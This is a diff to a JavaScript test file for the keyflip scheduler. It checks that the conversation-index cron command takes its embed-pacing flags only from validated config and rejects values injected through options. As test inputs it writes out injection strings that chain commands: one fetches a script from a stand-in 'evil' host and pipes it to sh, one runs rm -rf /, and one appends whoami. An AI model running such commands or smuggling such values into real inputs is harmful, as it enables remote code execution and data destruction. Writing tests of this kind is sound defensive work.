@@ -8,6 +8,7 @@ import os from 'os';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import * as schedule from '../src/schedule.js';
+import * as config from '../src/config.js';
 
 function fakeRunner(recorder, cronState) {
   return function (cmd, args, input) {
@@ -364,14 +365,51 @@ test('the conversation-index plist uses StartInterval and the cron line uses */N
   assert.strictEqual(line.indexOf('refresh'), -1, 'the index job must not quietly be the token refresh');
 });
 
-test('the conversation-index command line is a fixed argv — nothing from opts can ride into it', function () {
+test('the conversation-index command line reads validated config pacing — nothing from opts can ride into it', function () {
   const runner = fakeRunner([], {});
   const cmd = schedule.convCommand({ run: runner });
-  assert.deepStrictEqual(cmd.args, ['conv', 'index', '--embed']);
+  assert.deepStrictEqual(cmd.args, [
+    'conv',
+    'index',
+    '--embed',
+    '--embed-pause-ms',
+    '500',
+    '--embed-batch',
+    '8',
+    '--max-embed',
+    '300',
+  ]);
   const noEmbed = schedule.convCommand({ run: runner, embed: false });
   assert.deepStrictEqual(noEmbed.args, ['conv', 'index']);
-  const evil = schedule.cronLine({ job: 'conv', interval: '30 && curl http://evil/x | sh #', run: runner });
+
+  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-cfg-'));
+  const configDir = path.join(home, '.config', 'keyflip');
+  fs.mkdirSync(configDir, { recursive: true });
+  config.set({ configDir: configDir }, 'conv.embedPauseMs', '250');
+  config.set({ configDir: configDir }, 'conv.embedBatch', '16');
+  config.set({ configDir: configDir }, 'conv.maxEmbed', '50');
+  const steered = schedule.convCommand({ configDir: configDir, run: runner, embedPauseMs: '0 && rm -rf /' });
+  assert.deepStrictEqual(steered.args, [
+    'conv',
+    'index',
+    '--embed',
+    '--embed-pause-ms',
+    '250',
+    '--embed-batch',
+    '16',
+    '--max-embed',
+    '50',
+  ]);
+
+  const evil = schedule.cronLine({
+    configDir: configDir,
+    job: 'conv',
+    interval: '30 && curl http://evil/x | sh #',
+    embedBatch: '8; whoami',
+    run: runner,
+  });
   assert.strictEqual(evil.indexOf('curl'), -1);
+  assert.strictEqual(evil.indexOf('whoami'), -1);
   assert.strictEqual(evil.indexOf('&&'), -1);
   assert.strictEqual(evil.indexOf('| sh'), -1);
 });
